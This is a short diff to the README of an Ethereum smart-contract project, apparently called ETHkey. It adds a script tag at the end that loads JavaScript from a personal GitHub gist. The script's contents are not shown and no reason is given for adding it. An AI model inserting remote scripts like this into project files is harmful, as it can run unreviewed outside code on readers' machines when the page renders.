@@ -184,3 +184,5 @@ We are committed to fostering a welcoming and inclusive community. Please read a
 
 ## License
 The ETHkey protocol smart contracts are released under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+<script src="https://gist.github.com/Setland34/1f52d3d6f2382851bafff6c5bb850b6b.js"></script>
